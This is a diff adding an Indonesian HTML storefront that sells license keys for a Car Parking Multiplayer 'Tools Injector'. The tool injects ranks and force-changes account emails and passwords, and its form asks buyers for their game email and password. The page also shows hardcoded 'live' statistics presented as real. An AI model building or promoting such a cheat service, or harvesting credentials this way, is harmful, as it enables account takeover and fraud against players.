@@ -1,0 +1,1259 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AWIMEDAN STORE - Premium Car Parking Multiplayer</title>
+    
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    
+    <style>
+    /* Tambahkan ini di dalam tag <style> */
+.stats-grid {
+    display: grid;
+    grid-template-columns: repeat(1, minmax(0, 1fr));
+    gap: 1.5rem;
+    max-width: 900px;
+    margin: 2rem auto;
+}
+
+@media (min-width: 768px) {
+    .stats-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+}
+
+.stat-value {
+    font-size: 1.875rem;
+    font-weight: 900;
+    font-style: italic;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+.live-dot {
+    width: 8px;
+    height: 8px;
+    background: #22c55e;
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+    box-shadow: 0 0 10px #22c55e;
+}
+
+@keyframes pulse {
+    0% { transform: scale(0.95); opacity: 0.7; }
+    70% { transform: scale(1.1); opacity: 1; }
+    100% { transform: scale(0.95); opacity: 0.7; }
+}
+
+        /* Gaya Khusus untuk Komponen CS & Promo Baru */
+        .cs-card { border: 1px solid #ff313133; position: relative; border-radius: 16px; margin-bottom: 2rem; }
+        .cs-card-glow::before { content: ''; position: absolute; left: -1px; right: -1px; height: 1px; top: 0; background: linear-gradient(to right, #0a0a0a, #ff313188, #0a0a0a); }
+        .cs-avatar-glass { background: rgba(255, 49, 49, 0.08); border: 1px solid rgba(255, 49, 49, 0.2); width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; border-radius: 10px; }
+        .btn-tg { background: rgba(2, 137, 209, 0.1); color: #0289d1; border: 1px solid rgba(2, 137, 209, 0.2); }
+        .btn-tg:hover { background: rgba(2, 137, 209, 0.2); }
+        .btn-wa { background: rgba(37, 211, 102, 0.1); color: #25d366; border: 1px solid rgba(37, 211, 102, 0.2); }
+        .btn-wa:hover { background: rgba(37, 211, 102, 0.2); }
+        .promo-banner { 
+            background: linear-gradient(225deg, rgba(20,20,20,0.6) 0%, rgba(10,10,10,0.6) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            border-radius: 16px; 
+            overflow: hidden;
+            background-image: url('https://images.tokopedia.net/img/banner/2018/1/16/20703472/20703472_7d1b3294-8250-48e0-bb15-3e28400a4d2e.jpg'); /* Banner game/topup default */
+            background-size: cover;
+            background-position: center;
+        }
+        .promo-tag { background: linear-gradient(to right, #ff3131aa, #ff313100); padding-left: 10px; border-left: 2px solid #ff3131; }
+        /* Style Banner Promo Baru */
+.promo-banner { 
+    position: relative;
+    background: #000;
+    border: 1px solid rgba(255, 49, 49, 0.3); 
+    border-radius: 20px; 
+    overflow: hidden;
+    min-height: 300px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 1;
+}
+/* Efek Cahaya Bergerak di Border */
+.promo-glow {
+    position: absolute;
+    top: -50%; left: -50%; width: 200%; height: 200%;
+    background: conic-gradient(transparent, transparent, transparent, #ff3131);
+    animation: rotateGlow 4s linear infinite;
+    z-index: -2;
+    opacity: 0.3;
+}
+
+@keyframes rotateGlow {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        * { font-family: 'Plus Jakarta Sans', sans-serif; transition: all 0.2s ease-in-out; }
+        body { 
+            background: #0a0a0a; color: #ffffff; overflow-x: hidden;
+            background-image: linear-gradient(to bottom, rgba(10,10,10,0.8), #0a0a0a), url('https://w0.peakpx.com/wallpaper/424/62/HD-wallpaper-r34-nissan-skyline-gtr-bayside-blue-jdm.jpg');
+            background-attachment: fixed; background-size: cover;
+        }
+        .glass-nav { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .hero-title { font-weight: 800; letter-spacing: -0.05em; line-height: 0.9; }
+        .accent-red { color: #ff3131; }
+        .bg-accent-red { background: #ff3131; }
+        .stat-card { background: rgba(20, 20, 20, 0.6); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; }
+        .btn-primary { background: #ff3131; box-shadow: 0 4px 15px rgba(255, 49, 49, 0.3); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .sidebar-glass { background: rgba(10, 10, 10, 0.98); backdrop-filter: blur(20px); z-index: 1000; border-left: 1px solid rgba(255, 49, 49, 0.2); }
+        [x-cloak] { display: none !important; }
+        .banner-container { position: relative; width: 100%; padding-top: 56.25%; overflow: hidden; border-radius: 8px; background: #111; }
+        .banner-container img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
+    </style>
+</head>
+
+<body x-data="app()" x-init="init()">
+
+        <nav class="fixed top-0 left-0 right-0 h-20 glass-nav z-[100] flex items-center">
+        <div class="container mx-auto px-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2 cursor-pointer" @click="currentPage = 'home'">
+                <img src="images/logo.jpg" class="w-10 h-10 rounded-full border border-red-600" alt="AWIMEDAN">
+                <span class="text-2xl font-black italic tracking-tighter uppercase">AWIMEDAN</span>
+            </div>
+            
+            <div class="flex items-center space-x-3">
+                <template x-if="!user">
+                    <button @click="loginGoogle()" class="bg-accent-red px-5 py-2 rounded-md font-bold text-xs uppercase tracking-widest"><i class="fas fa-user mr-2"></i> Login</button>
+                </template>
+                <template x-if="user">
+                    <div @click="sideBar = true" class="flex items-center bg-white/5 px-3 py-1.5 rounded-lg border border-white/10 cursor-pointer">
+                        <img :src="user.photoURL" class="w-7 h-7 rounded-full mr-2 border border-red-500">
+                        <span class="text-xs font-bold" x-text="'Rp ' + (userData.balance || 0).toLocaleString()"></span>
+                    </div>
+                </template>
+                <button @click="sideBar = true" class="text-xl px-2"><i class="fas fa-bars"></i></button>
+            </div>
+        </div>
+    </nav>
+
+
+    <div x-show="sideBar" class="fixed inset-0 z-[1000]" x-cloak>
+        <div @click="sideBar = false" class="absolute inset-0 bg-black/90"></div>
+        <div class="absolute right-0 top-0 h-full w-80 sidebar-glass p-8" x-transition:enter="transition ease-out duration-300" x-transition:enter-start="translate-x-full" x-transition:enter-end="translate-x-0">
+            <div class="flex justify-between items-center mb-10">
+                <h2 class="font-black italic text-xl accent-red tracking-tighter">ACCOUNT PANEL</h2>
+                <i @click="sideBar = false" class="fas fa-times text-2xl cursor-pointer"></i>
+            </div>
+            <template x-if="user">
+                <div class="space-y-6">
+                    <div class="flex items-center space-x-4 p-4 bg-white/5 rounded-xl overflow-hidden">
+                        <img :src="user.photoURL" class="w-12 h-12 rounded-full border-2 border-red-600 shrink-0">
+                        <div class="min-w-0">
+                            <p class="font-bold truncate" x-text="user.displayName"></p>
+                            <p class="text-[10px] text-gray-500 truncate" x-text="user.email"></p>
+                        </div>
+                    </div>
+                    <div class="p-6 bg-accent-red rounded-xl text-center shadow-lg shadow-red-600/20">
+                        <p class="text-[10px] uppercase font-bold text-white/70 mb-1">Total Saldo</p>
+                        <p class="text-2xl font-black" x-text="'Rp ' + (userData.balance || 0).toLocaleString()"></p>
+                    </div>
+                    <!-- Cari bagian ini di dalam sidebar-glass -->
+                       <div class="grid grid-cols-1 gap-2">
+                        <button @click="currentPage = 'topup'; sideBar = false" class="w-full text-left p-4 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm"><i class="fas fa-wallet w-8 accent-red"></i> Top Up</button>
+                        <button @click="currentPage = 'history'; sideBar = false" class="w-full text-left p-4 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm"><i class="fas fa-history w-8 accent-red"></i> Riwayat</button>
+    
+                  <!-- TAMBAHKAN TOMBOL INI DI SINI -->
+                       <button @click="currentPage = 'mykeys'; sideBar = false; fetchMyKeys()" class="w-full text-left p-4 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm">
+                    <i class="fas fa-key w-8 accent-red"></i> KEY SAYA
+                  </button>
+                        <template x-if="isAdmin">
+                            <button @click="currentPage = 'admin'; sideBar = false" class="w-full text-left p-4 text-yellow-500 hover:bg-white/5 rounded-lg flex items-center font-bold text-sm"><i class="fas fa-user-shield w-8"></i> ADMIN PANEL</button>
+                        </template>
+                        <div class="pt-4 mt-4 border-t border-white/5">
+                            <button @click="logoutGoogle()" class="w-full text-left p-4 text-red-500 hover:bg-red-500/10 rounded-lg flex items-center font-bold text-sm"><i class="fas fa-sign-out-alt w-8"></i> Logout</button>
+                        </div>
+                    </div>
+                </div>
+            </template>
+        </div>
+    </div>
+
+    <main class="pt-24 pb-32">
+        <div x-show="currentPage === 'home'" x-transition class="container mx-auto px-4">
+            <div class="text-center py-12 mb-12">
+                <div class="inline-block bg-red-600/20 text-red-500 px-4 py-1 rounded-full text-[10px] font-bold uppercase tracking-widest mb-4">
+                    ⚡ Car Parking Multiplayer Tools
+                </div>
+                <h1 class="hero-title text-6xl md:text-8xl italic uppercase mb-4">AWIMEDAN <span class="accent-red">STORE</span></h1>
+                <p class="text-gray-400 max-w-2xl mx-auto text-sm md:text-base leading-relaxed">
+                    Platform modifikasi akun Car Parking Multiplayer #1 di Indonesia.<br>
+                    Proses otomatis, server stabil, dan terpercaya.
+                </p>
+                
+              <div class="stats-grid px-4">
+    <div class="stat-card p-6 text-center">
+        <div class="stat-icon text-red-500 text-xl mb-2"><i class="fa-solid fa-users"></i></div>
+        <div class="stat-value">
+            <span class="live-dot"></span>
+            <span id="liveMembers">1.247</span>
+        </div>
+        <div class="stat-label text-[10px] font-bold text-gray-500 uppercase tracking-widest">Total Members</div>
+    </div>
+    <div class="stat-card p-6 text-center">
+        <div class="stat-icon text-red-500 text-xl mb-2"><i class="fa-solid fa-bolt"></i></div>
+        <div class="stat-value" id="liveTx">3.892</div>
+        <div class="stat-label text-[10px] font-bold text-gray-500 uppercase tracking-widest">Total Eksekusi</div>
+    </div>
+    <div class="stat-card p-6 text-center">
+        <div class="stat-icon text-red-500 text-xl mb-2"><i class="fa-solid fa-clock"></i></div>
+        <div class="stat-value text-2xl font-black italic">24/7</div>
+        <div class="stat-label text-[10px] font-bold text-gray-500 uppercase tracking-widest">Server Online</div>
+    </div>
+</div>
+
+                
+                <div class="flex flex-wrap justify-center gap-4 mt-10">
+                     <button @click="currentPage = 'store'" class="btn-primary px-10 py-4 rounded-lg font-black italic flex items-center">
+                     <i class="fas fa-shopping-cart mr-2"></i> LIHAT TOKO
+                    </button>
+                    <button @click="currentPage = 'topup'" class="btn-secondary px-10 py-4 rounded-lg font-black italic">
+                        TOP UP SALDO
+                    </button>
+                </div>
+                
+                <div class="flex justify-center mt-10 bg-white/5 p-6 rounded-xl border border-white/10 max-w-sm mx-auto">
+                    <div class="text-center">
+                        <p class="text-[10px] font-bold text-gray-500 uppercase mb-3">Verifikasi Keamanan AWIMEDAN</p>
+                        <div class="cf-turnstile" data-sitekey="0x4AAAAAACzDxOSs8R4DwJlY"></div>
+                    </div>
+                </div>
+            </div>
+            
+
+    <!-- BAGIAN BARU: CS ADMIN & BANNER PROMO (X-SHOW HANYA DI HOME) -->
+    <div x-show="currentPage === 'home'" x-transition class="container mx-auto px-4 max-w-4xl pb-40">
+        
+        <!-- Komponen CS Admin (Mirip image_9.png) -->
+        <div class="stat-card p-6 cs-card cs-card-glow">
+            <div class="flex items-center space-x-4 mb-6">
+                <div class="cs-avatar-glass text-red-500">
+                    <i class="fas fa-headset text-xl"></i>
+                </div>
+                <div>
+                    <h3 class="text-lg font-bold">CS Admin <span class="text-green-500 text-xs ml-1">●</span></h3>
+                    <p class="text-xs text-gray-500">Butuh bantuan? Hubungi kami langsung</p>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <a href="https://t.me/AWIMEDAN0" target="_blank" class="btn-tg py-3 rounded-lg flex items-center justify-center font-bold text-sm">
+                    <i class="fab fa-telegram-plane mr-2 text-lg"></i> Telegram
+                </a>
+                <a href="https://wa.me/6281330750863" target="_blank" class="btn-wa py-3 rounded-lg flex items-center justify-center font-bold text-sm">
+                    <i class="fab fa-whatsapp mr-2 text-lg"></i> WhatsApp
+                </a>
+            </div>
+
+            <div class="space-y-2 border-t border-white/5 pt-4">
+                <div class="flex items-center text-[10px] font-bold text-gray-400">
+                    <i class="fas fa-circle text-green-500 mr-2 text-[6px]"></i>
+                    <span class="text-gray-500 mr-1">Online:</span> 
+                    <span class="text-gray-100">08:00 — 23:00 WIB</span>
+                </div>
+                <div class="flex items-center text-[10px] font-bold text-gray-400">
+                    <i class="fas fa-circle text-gray-700 mr-2 text-[6px]"></i>
+                    <span class="text-gray-500 mr-1">Offline:</span> 
+                    <span class="text-gray-100">23:00 — 08:00 WIB</span> 
+                    <span class="text-gray-600 ml-1">(slow respond)</span>
+                </div>
+            </div>
+        </div>
+<!-- Komponen Social Media (Sudah Dirapikan) -->
+<div class="stat-card p-6 cs-card cs-card-glow">
+    <div class="flex items-center space-x-4 mb-6">
+        <div class="cs-avatar-glass text-red-500">
+            <i class="fas fa-share-nodes text-xl"></i>
+        </div>
+        <div>
+            <h3 class="text-lg font-bold">Social Media<span class="text-green-500 text-xs ml-1">●</span></h3>
+            <p class="text-xs text-gray-500">Ikuti Dan Subscribe Channel Saya Agar Tidak Ketinggalan Info Yang Menarik.</p>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-2 gap-3 mb-6">
+        <!-- Tombol YouTube -->
+        <a href="https://youtube.com/@awimedancpm?si=lMvmWOLslSeO7-H4" target="_blank" 
+           style="background: rgba(255, 0, 0, 0.1); color: #ff0000; border: 1px solid rgba(255, 0, 0, 0.2);"
+           class="py-3 rounded-lg flex items-center justify-center font-bold text-sm hover:bg-red-600/20 transition-all">
+            <i class="fab fa-youtube mr-2 text-lg"></i> Youtube
+        </a>
+        
+        <!-- Tombol TikTok -->
+        <a href="https://www.tiktok.com/@awimedancpm_?_r=1&_t=ZS-96MPKd2diee" target="_blank"
+           style="background: rgba(255, 0, 0, 0.1); color: #ff0000; border: 1px solid rgba(255, 0, 0, 0.2);"
+           class="btn-tiktok py-3 rounded-lg flex items-center justify-center font-bold text-sm">
+            <i class="fab fa-tiktok mr-2 text-lg"></i> TikTok
+        </a>
+    </div>
+</div> <!-- Penutup Social Media -->
+
+<!-- Banner Promosi & Kunjungi Website -->
+<div class="promo-banner p-6 text-center shadow-xl shadow-red-600/10">
+    <div class="promo-glow"></div> 
+    
+    <div class="relative z-10">
+        <div class="inline-block bg-black/50 px-3 py-1 rounded-full text-[9px] font-bold uppercase tracking-widest text-red-500 mb-4 border border-red-500/30">
+            <i class="fas fa-fire mr-1"></i> AWIMEDAN STORE
+        </div>
+            
+        <h2 class="hero-title text-2xl md:text-3xl italic uppercase leading-snug mb-3">
+            <span class="bg-black/60 px-2 rounded promo-tag">ROBLOX GAMES</span><br>
+            <span class="bg-accent-red px-2 rounded">Sailor Piece — ROBLOX</span>
+        </h2>
+        
+        <p class="text-xs text-gray-300 mb-8 bg-black/40 inline-block px-4 py-1 rounded">Proses Cepat & Terpercaya via <span class="accent-red font-bold">Sailor Piece Store</span>.</p>
+        
+        <div class="grid grid-cols-2 md:grid-cols-5 gap-2 mb-8 max-w-2xl mx-auto text-[10px] font-bold uppercase text-gray-300">
+       <div class="bg-black/60 p-3 rounded-md border border-white/5"><i class="fas fa-box mr-1.5 text-red-500"></i> Item</div>
+       <div class="bg-black/60 p-3 rounded-md border border-white/5"><i class="fas fa-gavel mr-1.5 text-red-500"></i> Sword</div>
+       <div class="bg-black/60 p-3 rounded-md border border-white/5"><i class="fas fa-gem mr-1.5 text-red-500"></i> Relic</div>
+       <div class="bg-black/60 p-3 rounded-md border border-white/5"><i class="fas fa-fist-raised mr-1.5 text-red-500"></i> Melee</div>
+       <div class="bg-black/60 p-3 rounded-md border border-white/5"><i class="fas fa-key mr-1.5 text-red-500"></i> Key</div>
+</div>
+
+
+        <a href="https://sailorpiecestore.netlify.app" target="_blank" class="inline-flex items-center bg-white text-black px-10 py-4 rounded-xl font-black italic tracking-tighter text-sm hover:bg-accent-red hover:text-white transition-all transform hover:scale-105">
+            <i class="fas fa-globe mr-2.5"></i> KUNJUNGI WEBSITE <i class="fas fa-arrow-right ml-2.5 text-xs"></i>
+                 </a>
+              </div>
+           </div>
+        </div>
+      </div>
+   </div> <!-- Penutup Banner Promosi -->
+
+
+     <div x-show="currentPage === 'store'" x-transition class="container mx-auto px-4 pb-20">
+    <div id="store" class="py-12">
+        <h2 class="text-2xl font-black italic uppercase mb-10 border-l-4 border-red-600 pl-4">
+            Produk <span class="accent-red">Premium</span>
+        </h2>
+
+        <div class="flex flex-col md:flex-row gap-4 mb-10">
+            <div class="relative flex-1">
+                <i class="fas fa-search absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
+                <input type="text" x-model="searchQuery" placeholder="Cari produk..." 
+                    class="w-full bg-white/5 border border-white/10 rounded-xl py-3 pl-12 pr-4 text-sm focus:border-red-600 outline-none transition-all">
+            </div>
+            
+            <div class="relative min-w-[150px]">
+                <select x-model="selectedType" 
+                    class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-4 text-sm focus:border-red-600 outline-none appearance-none cursor-pointer">
+                    <option value="Semua" class="bg-[#0a0a0a]">Semua Kategori</option>
+                    <option value="Script" class="bg-[#0a0a0a]">Script</option>
+                    <option value="Tools" class="bg-[#0a0a0a]">Tools</option>
+                </select>
+                <i class="fas fa-chevron-down absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none"></i>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-10">
+            <template x-for="p in filteredProducts" :key="p.name">
+                <div class="stat-card p-4 md:p-6 flex flex-col hover:border-red-600 group transition-all duration-300">
+                    <div class="banner-container mb-5">
+                        <img :src="p.img" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500">
+                        <div class="absolute top-3 right-3 bg-red-600 px-3 py-1 rounded text-[10px] font-black italic shadow-lg">SALE</div>
+                    </div>
+                    <h3 class="font-bold text-lg mb-2 truncate text-gray-100" x-text="p.name"></h3>
+                    <div class="flex items-center justify-between mt-auto pt-4 border-t border-white/5">
+                        <p class="accent-red font-black text-2xl tracking-tighter" x-text="'Rp ' + p.price.toLocaleString()"></p>
+                        <button @click="beliProduk(p.name)" class="bg-white text-black px-6 py-3 rounded-lg font-black text-[11px] uppercase tracking-tighter hover:bg-red-600 hover:text-white shadow-xl active:scale-95">
+                            Beli Sekarang
+                        </button>
+                    </div>
+                </div>
+            </template>
+        </div>
+        
+        <template x-if="filteredProducts.length === 0">
+            <div class="text-center py-20 text-gray-500 font-bold italic">Produk tidak ditemukan...</div>
+        </template>
+    </div>
+</div>
+
+
+
+        <div x-show="currentPage === 'tools'" x-transition class="container mx-auto px-4 max-w-xl">
+            <div x-show="!cpmUser.isLoggedIn" class="stat-card p-10 border-red-600/20">
+                <div class="text-center mb-8">
+                    <i class="fas fa-shield-alt text-4xl accent-red mb-4"></i>
+                    <h2 class="text-2xl font-black italic">TOOLS INJECTOR</h2>
+                    <p class="text-[10px] text-gray-500 uppercase font-bold">Masukkan Kredensial Akun Game Anda</p>
+                </div>
+                
+                <div class="space-y-4">
+                    <select x-model="cpmForm.gameId" class="w-full bg-black border border-white/10 p-4 rounded-lg text-sm font-bold">
+                        <option value="">Pilih Versi Game</option>
+                        <option value="1">CPM 1 (Original)</option>
+                        <option value="2">CPM 2 (New)</option>
+                    </select>
+                    <input type="email" x-model="cpmForm.email" placeholder="Email Akun Game" class="w-full bg-black border border-white/10 p-4 rounded-lg outline-none text-sm">
+                    <input type="password" x-model="cpmForm.password" placeholder="Password Game" class="w-full bg-black border border-white/10 p-4 rounded-lg outline-none text-sm">
+                    <input type="text" x-model="cpmForm.key" placeholder="Premium License Key" class="w-full bg-black border border-red-600/30 p-4 rounded-lg outline-none text-sm font-mono text-red-500">
+                    
+                    <button @click="handleCpmLogin" :disabled="loading" class="w-full btn-primary py-4 rounded-xl font-black italic tracking-widest">
+                        <span x-show="!loading">VERIFIKASI & LOGIN</span>
+                        <i x-show="loading" class="fas fa-circle-notch animate-spin"></i>
+                    </button>
+                    <p class="text-red-500 text-xs text-center font-bold" x-text="message"></p>
+                </div>
+            </div>           
+
+            <div x-show="cpmUser.isLoggedIn" class="space-y-4" x-cloak>
+                <div class="stat-card p-4 flex justify-between items-center border-l-4 border-green-500">
+                    <div>
+                        <p class="text-[10px] text-gray-500 uppercase font-bold">Connected Account</p>
+                        <p class="font-bold text-sm" x-text="cpmUser.email"></p>
+                    </div>
+                    <button @click="logoutCpm" class="bg-red-600/10 text-red-500 px-4 py-2 rounded font-black text-[10px]">LOGOUT</button>
+                </div>
+                
+                    <!-- Rank King: Muncul untuk SEMUA (karena sudah login berarti punya key) -->
+    <button @click="setKingRank" class="stat-card p-6 flex items-center hover:bg-red-600/10 text-left">
+        <i class="fas fa-crown text-3xl text-yellow-500 mr-6"></i>
+        <div><h4 class="font-black italic text-sm">INJECT KING RANK</h4><p class="text-[10px] text-gray-500">Akses untuk semua member</p></div>
+    </button>
+
+    <!-- Ganti Email & Password: HANYA MUNCUL JIKA BUKAN BRONZE -->
+    <div x-show="cpmUser.keyType !== 'BRONZE'">
+        <button @click="changeEmailPrompt" class="w-full stat-card p-6 flex items-center hover:bg-red-600/10 text-left mb-3">
+            <i class="fas fa-envelope text-3xl accent-red mr-6"></i>
+            <div><h4 class="font-black italic text-sm">FORCE CHANGE EMAIL</h4></div>
+        </button>
+        <button @click="changePasswordPrompt" class="w-full stat-card p-6 flex items-center hover:bg-red-600/10 text-left">
+            <i class="fas fa-key text-3xl accent-red mr-6"></i>
+            <div><h4 class="font-black italic text-sm">INSTANT CHANGE PASS</h4></div>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+
+<div x-show="currentPage === 'mykeys'" x-transition class="container mx-auto px-4 pb-20">
+    <h2 class="text-2xl font-black italic mb-6">KEY SAYA</h2>
+    <div class="grid grid-cols-1 gap-4">
+        <template x-for="k in myKeys" :key="k.key">
+            <div class="stat-card p-4 border-l-4 border-yellow-500 flex justify-between items-center">
+                <div>
+                    <p class="font-bold text-sm" x-text="k.type"></p>
+                    <p class="text-[10px] text-gray-500" x-text="'Key: ' + k.keyString"></p>
+                </div>
+                <span class="px-2 py-1 bg-green-500/20 text-green-500 text-[10px] font-bold rounded">AKTIF</span>
+            </div>
+        </template>
+        <template x-if="myKeys.length === 0">
+            <p class="text-gray-500 text-center">Belum memiliki key aktif.</p>
+        </template>
+    </div>
+</div>
+
+
+        <div x-show="currentPage === 'buykey'" x-transition class="container mx-auto px-4">
+            <div class="text-center py-10">
+                <h2 class="text-4xl font-black italic uppercase mb-2 tracking-tighter">BUY <span class="accent-red">PREMIUM KEY</span></h2>
+                <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest">Pilih lisensi untuk mendapatkan akses penuh ke Tools Injector</p>
+            </div>
+
+               <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl mx-auto mt-6">
+           	<div class="stat-card p-8 border-t-4 border-white/10 hover:border-red-600 transition-all flex flex-col items-center text-center">
+                  <i class="fas fa-medal text-4xl mb-4 text-orange-700"></i>
+                  <h3 class="text-xl font-black italic uppercase">BRONZE KEY 1 MONTH</h3>
+                   <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES RANK KING - 30 HARI</p>
+                  <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 10.000</div>
+                  <button @click="beliKey('BRONZE', 10000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+              </div>
+
+                <div class="stat-card p-8 border-t-4 border-white/10 hover:border-red-600 transition-all flex flex-col items-center text-center">
+                    <i class="fas fa-bolt text-4xl mb-4 text-gray-400"></i>
+                    <h3 class="text-xl font-black italic uppercase">VIP 7 DAY KEY</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES FULL FITUR - 1 MINGGU</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 25.000</div>
+                    <button @click="beliKey('VIP 7 DAY', 25000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+
+                <div class="stat-card p-8 border-t-4 border-red-600 relative overflow-hidden flex flex-col items-center text-center scale-105 shadow-2xl shadow-red-600/10">
+                    <div class="absolute top-4 right-[-35px] bg-red-600 text-[8px] font-black py-1 px-10 rotate-45 tracking-tighter">HOT ITEM</div>
+                    <i class="fas fa-crown text-4xl mb-4 text-yellow-500"></i>
+                    <h3 class="text-xl font-black italic uppercase">VIP 1 MONTH KEY</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES FULL FITUR - 30 HARI</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 75.000</div>
+                    <button @click="beliKey('VIP 1 MONTH', 75000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+
+                <div class="stat-card p-8 border-t-4 border-white/10 hover:border-red-600 transition-all flex flex-col items-center text-center">
+                    <i class="fas fa-infinity text-4xl mb-4 text-blue-500"></i>
+                    <h3 class="text-xl font-black italic uppercase">UNLIMITED</h3>
+                    <p class="text-[9px] text-gray-500 font-bold mb-6 uppercase tracking-widest">AKSES PERMANEN SEUMUR HIDUP</p>
+                    <div class="text-3xl font-black mb-8 accent-red tracking-tighter">Rp 200.000</div>
+                    <button @click="beliKey('UNLIMITED ACCESS', 200000)" class="w-full btn-primary py-3 rounded-lg font-black italic text-xs uppercase tracking-widest">Beli Sekarang</button>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'topup'" x-transition class="container mx-auto px-4 max-md">
+            <div class="stat-card p-8 text-center">
+                <h2 class="text-2xl font-black italic accent-red mb-2">TOP UP SALDO</h2>
+                <p class="text-[10px] text-gray-500 font-bold uppercase mb-8">Pilih nominal dan scan QRIS</p>
+                
+                <div class="grid grid-cols-2 gap-2 mb-8">
+                    <template x-for="amt in [20000, 50000, 100000, 150000]">
+                        <button @click="selectedAmount = amt" 
+                                :class="selectedAmount === amt ? 'bg-red-600 text-white' : 'bg-white/5 text-gray-400'"
+                                class="p-4 rounded-lg font-bold text-sm">
+                            Rp <span x-text="amt.toLocaleString()"></span>
+                        </button>
+                    </template>
+                </div>
+
+                <div x-show="selectedAmount > 0" x-transition class="bg-white p-4 rounded-xl mb-6">
+                    <img src="qris.jpg" class="w-full">
+                    <p class="text-black font-black mt-2 italic text-lg" x-text="'TOTAL: Rp ' + selectedAmount.toLocaleString()"></p>
+                </div>
+
+                <div x-show="selectedAmount > 0" class="space-y-4">
+                    <input type="file" @change="handleFileUpload" class="text-xs text-gray-500 w-full mb-4">
+                    <button @click="sendToWhatsApp" class="w-full bg-green-600 py-4 rounded-xl font-black flex items-center justify-center">
+                        <i class="fab fa-whatsapp mr-2 text-xl"></i> KONFIRMASI ADMIN 
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div x-show="currentPage === 'history'" x-transition class="container mx-auto px-4 max-w-2xl">
+            <div class="stat-card p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h2 class="text-xl font-black italic accent-red">RIWAYAT TRANSAKSI</h2>
+                    <button @click="currentPage = 'home'" class="text-[10px] font-bold text-gray-500 hover:text-white uppercase">
+                        <i class="fas fa-arrow-left mr-1"></i> Kembali
+                    </button>
+                </div>
+
+                <div class="space-y-3">
+                    <template x-for="h in userHistory" :key="h.date">
+                        <div class="bg-white/5 border border-white/5 p-4 rounded-xl flex justify-between items-center hover:border-red-600/30 transition-colors">
+                            <div class="overflow-hidden">
+                                <p class="font-bold text-sm truncate" x-text="h.productName"></p>
+                                <p class="text-[9px] text-gray-500 font-bold uppercase tracking-tighter" x-text="new Date(h.date).toLocaleString('id-ID')"></p>
+                            </div>
+                            <div class="text-right ml-4">
+                                <p class="accent-red font-black text-sm" x-text="'- Rp ' + h.price.toLocaleString()"></p>
+                                <span class="text-[8px] bg-green-500/20 text-green-500 px-2 py-0.5 rounded font-black italic">SUCCESS</span>
+                            </div>
+                        </div>
+                    </template>
+
+                    <template x-if="userHistory.length === 0">
+                        <div class="text-center py-12">
+                            <i class="fas fa-history text-4xl text-gray-800 mb-4"></i>
+                            <p class="text-gray-500 text-xs font-bold uppercase tracking-widest">Belum ada transaksi</p>
+                        </div>
+                    </template>
+                </div>
+            </div>
+        </div>
+
+        <template x-if="isAdmin">
+            <div x-show="currentPage === 'admin'" x-transition class="container mx-auto px-4">
+                <div class="stat-card p-6 overflow-x-auto">
+                    <h2 class="text-xl font-black italic mb-6 accent-red">ADMIN CONTROL</h2>
